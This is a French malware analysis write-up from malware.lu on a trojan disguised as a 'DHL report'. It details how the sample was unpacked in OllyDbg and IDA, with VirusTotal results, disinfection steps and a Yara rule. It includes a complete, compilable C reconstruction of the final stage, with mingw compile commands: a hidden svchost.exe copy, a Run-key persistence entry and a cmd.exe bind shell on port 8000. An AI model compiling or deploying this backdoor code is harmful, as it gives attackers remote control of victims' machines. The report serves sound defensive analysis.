# XPXAXCXK aka DHL report #



## Introduction ##
Récemment nous avons eu le sample suivant ac2d9579ece4d0ab42a8a9898630246c, dont les noms de fichier reporté sont DHL\_report.exe, svchost.exe. L'unpack nous ayant posé quelques problèmes, nous allons détailler la procédure appliquée pour arriver au bout.

## Outils ##
  * Un débogueur pour l'analyse dynamique (dans notre cas [OllyDbg](http://www.ollydbg.de/))
  * [Yara](https://code.google.com/p/yara-project/) + [rules](http://code.google.com/p/malware-lu/source/browse/tools/yara/packer.yara)
  * [IDA 5.0 free](http://www.hex-rays.com/products/ida/support/download_freeware.shtml) Les idb des fichiers analysés sont fournis ([\_00330000.finalstage.idb](http://code.google.com/p/malware-lu/source/browse/xpxaxcxk/idb/_00330000.finalstage.idb)). Dans ce qui suit, par convention, on nommera les fonctions par leur adresse virtuelle suivi entre parenthèses du nom donné dans l'idb. Example: DEADBEEFh (viandemorte).

## Ressources ##
  * Binaire original [ac2d9579ece4d0ab42a8a9898630246c](http://www.malware.lu/_download.php?md5=ac2d9579ece4d0ab42a8a9898630246c)
  * Binaire unpacké [f6da1566b4ba832b108212ebf4ece863](http://www.malware.lu/_download.php?md5=f6da1566b4ba832b108212ebf4ece863) / [9c11f53798d611c22840b48b4897afa4](http://www.malware.lu/_download.php?md5==9c11f53798d611c22840b48b4897afa4) (sans garbage du dump)
  * [Dump stage final](http://code.google.com/p/malware-lu/source/browse/xpxaxcxk/bin/_00330000.finalstage.mem) (base adresse 00330000h, entry point 00330100h)
  * idb stage final [\_00330000.finalstage.idb](http://code.google.com/p/malware-lu/source/browse/xpxaxcxk/idb/_00330000.finalstage.idb)

## Information ##

### Virus-Total ###

```
y0ug@malware.lu:~$ virustotal.py -h ac2d9579ece4d0ab42a8a9898630246c
nProtect: -
CAT-QuickHeal: -
McAfee: BackDoor-FFH
TheHacker: -
K7AntiVirus: Trojan
VirusBuster: -
NOD32: Win32/TrojanDownloader.Wauchos.A
F-Prot: W32/Trojan2.NRGL
Symantec: Downloader.Dromedan
Norman: W32/Zbot.CJFW
ByteHero: -
TrendMicro-HouseCall: TROJ_KRYPTIK.LUI
Avast: Win32:Dropper-gen [Drp]
eSafe: -
ClamAV: -
Kaspersky: Trojan.Win32.Jorik.Androm.iz
BitDefender: Gen:Variant.Kazy.70611
SUPERAntiSpyware: Trojan.Agent/Gen-MultiC
Emsisoft: Trojan.Crypt!IK
Comodo: Heur.Suspicious
F-Secure: Trojan-Dropper:W32/Agent.DTXN
DrWeb: BackDoor.Andromeda.22
VIPRE: Trojan.Win32.Generic!BT
AntiVir: TR/Jorik.Androm.C
TrendMicro: TROJ_KRYPTIK.LUI
McAfee-GW-Edition: -
Sophos: Troj/Zbot-BWI
eTrust-Vet: -
Jiangmin: -
Antiy-AVL: -
Microsoft: Worm:Win32/Gamarue.F
ViRobot: -
GData: Gen:Variant.Kazy.70611
Commtouch: W32/Trojan2.NRGL
AhnLab-V3: Win-Trojan/Kazy.48128.B
VBA32: -
PCTools: Downloader.Dromedan
Rising: -
Ikarus: Trojan.Crypt
Fortinet: W32/Kryptik.AB!tr
AVG: Crypt.AWFD
Panda: -
------------------------------------------------------------------------
MIMEType: application/octet-stream
Subsystem: Windows GUI
TimeStamp: 2011:03:25 06:01:22+01:00
EntryPoint: 0x118c
------------------------------------------------------------------------
Section		Virt. Address	Virt. Size	Raw Size	Entropy	MD5
.text		4096		23366		23552		6.86	d81334bcbafa50f856bf69d5f9e40905
.data		28672		23456		23552		7.19	c5c6a70ed77de35a574e2c16a438fea3
------------------------------------------------------------------------
Imports:
 KERNEL32.dll:		LoadLibraryExW, GetModuleHandleA, lstrcmpiA, LoadLibraryA, 
 SHLWAPI.dll:		PathSearchAndQualifyW, 
 USER32.dll:		wsprintfA, 
------------------------------------------------------------------------
suspicious-insight: True
------------------------------------------------------------------------
trid: Win32 Dynamic Link Library (generic) (65.4%)
Generic Win/DOS Executable (17.2%)
DOS Executable Generic (17.2%)
Autodesk FLIC Image File (extensions: flc, fli, cel) (0.0%)
------------------------------------------------------------------------
SHA256: 46707587bf8c2fa75424ae409fb1377e170681286187e0685d99f8f33bb90325
MD5: ac2d9579ece4d0ab42a8a9898630246c
Detection ratio: 27/42
Scan date: 2012-05-14 22:55:25
First seen: 2012-05-14 03:06:58
Last seen: 2012-05-14 22:55:25
Size: 48128
Unique source: 24
Reported filenames: DHL_report.exe, qqdi.com, FE21FBF8000201A7BC9C007E1B56A800C7914B2C.exe, DHL report.exe, svchost.exe, DHL report-1.exe, file-3945960_exe, 
------------------------------------------------------------------------
URL: https://www.virustotal.com/file/46707587bf8c2fa75424ae409fb1377e170681286187e0685d99f8f33bb90325/analysis/1337036125/
```

### Yara ###
Avec les [rules suivante](http://code.google.com/p/malware-lu/source/browse/tools/yara/packer.yara)
```
y0ug@malware.lu:~$ yara ~/tools/yara-rules/packer.yara ac2d9579ece4d0ab42a8a9898630246c.exe
y0ug@malware.lu:~$
```

## Unpack ##
Voici le fonctionnement général du packer:
  * Allouer un espace mémoire M0 de la taille du champ SizeOfImages
  * Se copie dedans
  * Jmp dedans
  * Allouer un espace mémoire M1 de la taille du binaire packé
  * Copie le binaire dedans
  * Allouer un espace mémoire M2
  * Decoder le base64 contenu de M1 dans M2
  * Désallouer M1
  * Decoder les données de M2
  * Alloue M3 de 3E6Fh
  * Alloue M4
  * Décompresser M2 dans M3 (M4 utilisé pour stocker des informations lors de la décompression)
  * Désalloue M4
  * Execution


### Phase 1 ###

Nous savons que le packer va allouer plusieurs fois de la mémoire, nous passons en mode dynamique avec notre débogueur.

Définissons un breakpoint sur l'exécution de Kernel32.VirtualAlloc, pour cela nous affichons la fenêtre Executable modules, puis l'option ViewNames sur Kernel32

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-exec-modules.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-exec-modules.png)

Mise en place du breakpoint

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-set-br-virtualalloc.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-set-br-virtualalloc.png)

Nous lançons le programme et nous nous arrêtons sur le 1er breakpoint

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-virtualalloc1.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-virtualalloc1.png)

Allocation de D000h qui correspond à la taille de SizeOfImage dans le PE du fichier

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-virtualalloc1-out.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-virtualalloc1-out.png)

En sortie VirtualAlloc retourne l'adresse mémoire allouée ici 00860000h

Nous remarquons la variable Protect = PAGE\_READONLY ce qui laisse penser un appel à Kernel32.VirtualProtect par la suite, pour rendre au moins possible l'écriture dans cette page. Nous applique la technique précédente pour mettre en place le breakpoint sur VirtualProtect et reprenons l'exécution.

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-virtualprotect1.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-virtualprotect1.png)

Il change comme prévu, la protection de 00860000h en la passant à PAGE\_EXECUTE\_READWRITE nous avançons, jusqu'à la sortie de VirtualProtect. Nous pouvons maintenant définir un breakpoint en cas d'accès à cette zone mémoire (F2 sur la zone dans le memory map)

Note: Si nous définissons le breakpoint sur la page mémoire avant le VirtualProtect celui-ci ne marchera pas, car il sera enlevé lors de l'appel à VirtualProtect (enfin dans notre cas sous OllyDbg)

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-memoire1.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-memoire1.png)

Reprenons l'exécution du programme

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-copy-byte-bin.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-copy-byte-bin.png)

Nous constatons qu'il copie le programme actuellement en mémoire à l'adresse allouée, avec une boucle byte à byte.

Continuons l'exécution

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-virtualprotect2.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-virtualprotect2.png)

Breakpoint sur un appel à VirtualProtect dans le but de passer tout le programme en RWE.

Continuons l'exécution

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-virtualprotect3.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-virtualprotect3.png)

Encore un VirtualProtect sur un espace mémoire du programme

Continuons l'exécution

### Phase 2 ###

#### Décodage base64 et déchiffrement ####
![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-virtualalloc2.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-virtualalloc2.png)

Notons le from 008668DDh qui nous montre que l'exécution ce trouve maintenant dans la page 00860000h

Même principe qu’au-dessus nous définissons un breakpoint mémoire sur la nouvelle page 00870000h et continuons l'exécution.

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-memoire2.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-memoire2.png)

Nous arrivons sur une boucle plus compliquer. Nous ne chercherons pas à la comprendre et nous continuons l'exécution pour arriver sur un nouveau VirtualAlloc.

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-virtualalloc3.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-virtualalloc3.png)

Nous en profitons pour regarder, ce qu'il y a été écrit dans 00870000h

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-dump-00870000.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-dump-00870000.png)

Cela ressemble à du base64 pour en être sur nous "dumpons" la page 00870000h à l'aide de LordPE ou de OllyDbg directement

```
y0ug@malware.lu:~$ base64 -d _00870000.mem.b64.mem >  _00870000.mem.b64.mem.decode
base64: invalid input
y0ug@malware.lu:~$ hd _00870000.mem.b64.mem.decode | head
00000000  49 62 4b 55 4d 59 4f 63  f1 27 f1 f1 17 23 f1 f1  |IbKUMYOc.'...#..|
00000010  ef 35 85 9d 7f ef 06 e6  fb 14 aa f9 e3 ee 83 10  |.5..............|
00000020  3e 53 fe 6b f5 e4 18 08  53 11 38 ee 42 dc c5 c0  |>S.k....S.8.B...|
00000030  03 ed 8d 70 8b 91 04 e5  18 69 bb 7a a3 fc 43 1f  |...p.....i.z..C.|
00000040  8f 38 dd 65 e4 db 5e 43  d9 fc 33 56 ef 52 eb a4  |.8.e..^C..3V.R..|
00000050  48 9e 61 13 18 6f 7e 29  7b 4d d4 43 14 cb b7 36  |H.a..o~){M.C...6|
00000060  00 19 4b 8e 9e 40 a8 ab  74 ff 0c af 32 4c 5c f9  |..K..@..t...2L\.|
00000070  ff ec 12 8e 63 5e d4 fa  f8 1f f9 b8 5c 2c e3 65  |....c^......\,.e|
00000080  59 c1 bc 01 77 30 98 ad  c5 c4 d4 15 e4 65 68 84  |Y...w0.......eh.|
00000090  33 e7 a5 6d 61 b0 50 c1  a9 69 9c bf a2 38 c8 e5  |3..ma.P..i...8..|
```

Le décodage fonctionne, le message d'erreur vient du fait que la page contient du garbage après le base64 que nous n'avons pas enlevé.

Reprenons l'exécution du programme en n'oubliant pas de définir un breakpoint mémoire sur la page allouée 00880000h comme précédemment.

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-memoire3.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-memoire3.png)

Nous définissons un breakpoint sur l'instruction rencontré et effectuons quelques tours de boucle.

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-loop-base64.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-loop-base64.png)

Nous avions donc raison sur le base64, nous retrouvons les valeurs précédentes.

Enlevons notre breakpoint et relançons l'exécution.

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-virtualalloc4.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-virtualalloc4.png)

Nous allons vérifier les données à 00870000h pour voir si elles n'ont pas changé.

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-dump-00870000-2.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-dump-00870000-2.png)

Les données ont donc été modifiées et nous remarquons le XPXAXCXK (d'où le nom que nous lui avons donné). Nous pensons qu'il a dû exécuter une boucle de déchiffrement, mais cela ne nous est pas utile à reverser.

#### Décompression ####

Définissons un breakpoint sur le nouvel espace mémoire 00870000h.

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-virtualalloc5.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-virtualalloc5.png)

Encore une allocation. Nouvelle définition d'un breakpoint sur la page mémoire 00890000h

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-mem-00870000.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-mem-00870000.png)

Breakpoint en écriture dans 00870000h après avoir avancé de quelques instructions en mode pas à pas.

Rien ne saute aux yeux dans les données écrites, dedans continuons.

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-mem-00890000.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-mem-00890000.png)

Écriture d'un M dans 0089000, bon signe. Mettons un breakpoint sur cette instruction et continuons quelquefois

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-mem-00890000-MZ.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-mem-00890000-MZ.png)

Voilà un joli PE, pendant l'avancement nous remarquons que les espaces de byte NULL sont sautées, ce qui nous laisse pensé à un l'utilisation d'un algo de compression.

Nous avançons en pas à pas afin de trouver une condition qui pourrait signifier la fin de la boucle afin de pouvoir récupèrerai le binaire.

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-afterloop.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-br-afterloop.png)

Nous trouvons l'endroit qui ressemble à la fin de la boucle. Nous définissons un breakpoint après la condition et nous continuons.

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-pe-full.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-pe-full.png)

#### Extraction du binaire ####

Le binaire ce trouve maintenant en mémoire, il reste à "dumper" la page 00890000h avec OllyDbg

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-final-dump.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-final-dump.png)


## Analyse du binaire unpacker ##

### Information ###

#### Virus-Total ####
```
y0ug@malware.lu:~$ virustotal.py -h f6da1566b4ba832b108212ebf4ece863
nProtect: Worm.Gamaure.A
CAT-QuickHeal: (Suspicious) - DNAScan
McAfee: -
TheHacker: Trojan/Kryptik.afjs
K7AntiVirus: -
VirusBuster: Trojan.Kryptik!jA8GsXcFv4g
NOD32: a variant of Win32/Kryptik.AFJS
F-Prot: -
Symantec: Suspicious.Graybird.1
Norman: -
ByteHero: Virus.Win32.Heur.c
TrendMicro-HouseCall: -
Avast: Win32:Malware-gen
eSafe: -
ClamAV: -
Kaspersky: HEUR:Trojan.Win32.Generic
BitDefender: Worm.Gamaure.A
SUPERAntiSpyware: -
Comodo: -
F-Secure: Worm.Gamaure.A
DrWeb: BackDoor.Andromeda.22
VIPRE: -
AntiVir: TR/Crypt.XPACK.Gen
TrendMicro: -
McAfee-GW-Edition: -
Emsisoft: Trojan.Win32.Spy!IK
eTrust-Vet: -
Jiangmin: Trojan/Generic.adqsb
Antiy-AVL: -
Microsoft: Worm:Win32/Gamarue.I
ViRobot: -
GData: Worm.Gamaure.A
Commtouch: -
AhnLab-V3: -
VBA32: Malware-Cryptor.Inject.gen.2
PCTools: HeurEngine.ZeroDayThreat
Rising: -
Ikarus: Trojan.Win32.Spy
Fortinet: -
AVG: Downloader.Agent2.BBXB
------------------------------------------------------------------------
MIMEType: application/octet-stream
Subsystem: Windows GUI
TimeStamp: 2012:05:03 17:54:53+02:00
EntryPoint: 0x141c
------------------------------------------------------------------------
Section		Virt. Address	Virt. Size	Raw Size	Entropy	MD5
.text		4096		13019		13312		7.85	64f2067725d20490fe715f7bf3a2edc1
------------------------------------------------------------------------
trid: Generic Win/DOS Executable (49.5%)
DOS Executable Generic (49.5%)
VXD Driver (0.7%)
Autodesk FLIC Image File (extensions: flc, fli, cel) (0.1%)
------------------------------------------------------------------------
SHA256: 39208cbaf99c57d2c63b14c85456b3905588c01184958796028aa32959f6e923
MD5: f6da1566b4ba832b108212ebf4ece863
Detection ratio: 21/40
Scan date: 2012-05-16 08:46:38
First seen: 2012-05-16 08:46:38
Last seen: 2012-05-16 08:46:38
Size: 16384
Unique source: 1
Reported filenames: ac2d9579ece4d0ab42a8a9898630246c.unpack.exe, 
------------------------------------------------------------------------
URL: https://www.virustotal.com/file/39208cbaf99c57d2c63b14c85456b3905588c01184958796028aa32959f6e923/analysis/1337157998/
```

#### Yara ####
Avec les [rules suivante](http://code.google.com/p/malware-lu/source/browse/tools/yara/packer.yara)
```
y0ug@malware.lu:~$ yara ~/tools/yara-rules/packer.yara ac2d9579ece4d0ab42a8a9898630246c.unpack.exe
y0ug@malware.lu:~$
```

#### Strings ####
```
y0ug@malware.lu:~$ strings -el ac2d9579ece4d0ab42a8a9898630246c.unpack.exe
kernel32.dll
```


### Analyse static ###

Ouverture avec IDA pour voir à quoi nous avons à faire:
Nous remarquons qu'il n'y pas d'imports, et juste un string au format unicode


Très peux de fonction détecter par IDA et beaucoup de data. Toutes les conditions réunies pour un packer.

Nous regardons rapidement avec IDA le code et un call parait intéressant 0040176Eh

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/ida-start-call.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/ida-start-call.png)

Allons voir la fonction 00401284h (sub\_401284). En ce déplacent dedans nous remarquons, cet appel a l'adresse 040012F9h qui fait penser a celui de VirtualAlloc mais avec 2 paramètres en plus, après quelque recherche sur MSDN nous trouverons cette fonction [ZwAllocateVirtualMemory](http://msdn.microsoft.com/en-us/library/windows/hardware/ff566416%28v=vs.85%29.aspx)

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/ida-sub_401284-alloc.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/ida-sub_401284-alloc.png)

```
NTSTATUS ZwAllocateVirtualMemory(
  __in     HANDLE ProcessHandle = FFFFFFFFh,
  __inout  PVOID *BaseAddress = ebp+var_1C = 0,
  __in     ULONG_PTR ZeroBits = 0,
  __inout  PSIZE_T RegionSize = ebp+var_20,
  __in     ULONG AllocationType = 1000 = MEM_COMMIT | MEM_RESERVE
  __in     ULONG Protect = 40 = PAGE_EXECUTE_READWRITE
);
```

Nous continuons de scroller un peu pour arriver sur un call eax à 040013ACh juste avant la fin de la fonction ce qui est bon signe.

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/ida-sub_401284-calleax.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/ida-sub_401284-calleax.png)

### Analyse dynamique ###

Afin de gagner du temps, nous passons en analyse dynamique et définissons 3 breakpoints sur les adresses trouvées plus haut.
  * 0040176Eh ( call 00401284h )
  * 040012F9h ( call ZwAllocateVirtualMemory )
  * 040013ACh ( call eax )

Nous nous arrêtons bien sur le 1er breakpoint ce qui est bon signe. Nous pouvons continuer l'exécution du programme, puis le programme pause comme prévu sur ZwAllocateVirtualMemory

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-ZwAllocateVirtualMemory.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-ZwAllocateVirtualMemory.png)

Nous passons directement au call eax avec eax qui pointe sur 00330100h

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-calleax.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-calleax.png)

00330100h se trouve bien sur une page en RWE

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-memap.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-memap.png)

Nous avançons d'un pas dedans

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-final-stage.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/olly-final-stage.png)

Cela ressemble au code final nous "dumpons" la page avec OllyDbg. (Ne fermons pas directement OllyDbg nous allons en avoir besoin pour fixer "l'IAT")

Ouvrons [le dump](http://code.google.com/p/malware-lu/source/browse/xpxaxcxk/bin/_00330000.finalstage.mem) avec IDA, en précisant l'offset à 00330000h.

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/ida_final_offset.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/ida_final_offset.png)

Avec la version free de IDA nous devons convertir en Code à partir de l'adresse du point d'entrée 00330100h

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/ida_final_code_conv.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/ida_final_code_conv.png)

Créons la fonction start à l'adresse 00330100h

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/ida_final_code_func.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/ida_final_code_func.png)

Maintenant à partir de OllyDbg nous pouvons renomer les fonctions appelés dans IDA afin d'avoir un code plus compréhensible.

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/ida_final_fct.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/ida_final_fct.png)

Une fois les fonctions définis nous obtenons quelque chose comme ça:

![http://malware-lu.googlecode.com/git/xpxaxcxk/img/ida_finale_code.png](http://malware-lu.googlecode.com/git/xpxaxcxk/img/ida_finale_code.png)

## Analyse static stage final ##

Ce qui donne (idb [\_00330000.finalstage.idb](http://malware-lu.googlecode.com/git/xpxaxcxk/idb/_00330000.finalstage.idb)):
  * Installation avec les fonctions:
    * CopyFileA(GetModuleFilenameA, "%ALLUSERSPROFILE%\\svchost.exe");
    * setFileAttribute("%ALLUSERSPROFILE%\\svchost.exe", FILE\_ATTRIBUTE\_HIDDEN | FILE\_ATTRIBUTE\_SYSTEM);
    * RegOpenKeyValueExA(HKEY\_LOCAL\_MACHINE, "%ALLUSERSPROFILE%\\svchost.exe", KEY\_WRITE)
      * Si il échoue RegOpenKeyValueExA(HKEY\_CURRENT\_USER, "%ALLUSERSPROFILE%\\svchost.exe", KEY\_WRITE)
    * RegSetValueExA(SunJavaUpdateSched)

  * Mise en place du listen:
    * WSAStartup
    * WSASocketA
    * ntohs(8000) ; convertie le port en format réseau
    * bind
    * listen ( écoute sur le port 8000 )

  * Boucle backdoor cmd.exe :
    * accept
    * CreateProcess cmd.exe ; avec redirection sur le réseau

Et qui peut être écrite ainsi :

```c

/*
i586-mingw32msvc-gcc -Os -c code.c
i586-mingw32msvc-ld code.o -lws2_32 -lkernel32 -lshell32 -lmsvcrt -ladvapi32 -subsystem=windows
i586-mingw32msvc-strip a.exe
*/
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

//int main(int argc, char *argv[]){
int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
LPSTR lpCmdLine, int nCmdShow){

HANDLE hHeap;
PSTR sDst, sSrc;
HKEY hkReg;
LONG ret;
DWORD len;

WSADATA wsaData;
struct sockaddr_in serv;
SOCKET sock, cli;

STARTUPINFO si;
PROCESS_INFORMATION pi;

/*hHeap = GetProcessHeap();
sDst = (PSTR)RtlAllocateHeap(hHeap, NULL, 0x104);*/
sDst = malloc(0x104);
if(sDst == NULL){
ExitProcess(0);
}
//sSrc = (PSTR)RtlAllocateHeap(hHeap, NULL, 0x104);
sSrc = malloc(0x104);
if(sSrc == NULL){
ExitProcess(0);
}


ExpandEnvironmentStrings("\%ALLUSERSPROFILE\%\\svchost.exe", sDst, 0x104);
GetModuleFileName(NULL , sSrc, 0x104);
CopyFileA(sSrc, sDst, 0);
SetFileAttributes(sDst, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
0, KEY_WRITE, &hkReg);

if (ret != 0){
ret = RegOpenKeyEx(HKEY_CURRENT_USER,
"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
0, KEY_WRITE, &hkReg);
}
if (ret == 0){
len = strlen(sDst) + 1; // +1 ?
RegSetValueEx(hkReg, "SunJavaUpdateSched", 0, 1, sDst, len);
RegCloseKey(hkReg);
}

WSAStartup(MAKEWORD(1, 1), &wsaData);
serv.sin_family = AF_INET;
serv.sin_addr.s_addr = 0;
serv.sin_port = ntohs(0x1f40);

sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
if (sock == -1){
ExitProcess(0);
}

ret = bind(sock, (SOCKADDR *) &serv, sizeof(serv));
if (ret == -1){
ExitProcess(0);
}

ret = listen(sock, 5);
if (ret == -1){
ExitProcess(0);
}

while(1){
ZeroMemory(&si, sizeof(STARTUPINFO));

cli = accept(sock, 0, 0);
si.cb = sizeof(STARTUPINFO);
si.hStdInput = (HANDLE)cli;
si.hStdOutput = (HANDLE)cli;
si.hStdError = (HANDLE)cli;
si.wShowWindow = 0;
si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE,
0, NULL, NULL, &si, &pi);
}
}
```

## Désinfection ##
  * Verifier dans le dossier %ALLUSERSPROFILE%\\svchost.exe l'existence d'un fichier svchost.exe.
    * S’il existe, le supprimer
  * Verifier l'existence de la clé registre SunJavaUpdateSched dans "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" pour HKEY\_LOCAL\_MACHINE et HKEY\_CURRENT\_USER.
    * Si une d'elles existe, là supprimer.

## Signature ##
Voici une simple signature yara du binaire ac2d9579ece4d0ab42a8a9898630246c

```
rule xpxaxcxk_dhlreport
{
	strings:
		$c = "ClientCount.exe" nocase
		$d = "?WideTranslator@@" nocase

	condition:
		any of them
}
```

## Conlusion ##
Le code malveillant en lui-même n'est pas du tout complexe. Une simple backdoor en écoute sur le port 8000 avec un système de persistance assez standard et facilement détectable. Sachant qu’actuellement la plupart des utilisateurs sur internet sont derrière un box donc pas directement accessible depuis l'extérieur, nous nous demandons l'intérêt d'un tel code (si quelqu'un à des informations sur des pays qui ne fournissement pas encore de box nous somme preneur). Nous notons l'utilisation de technique de packing démesuré en comparaison du code exécuté.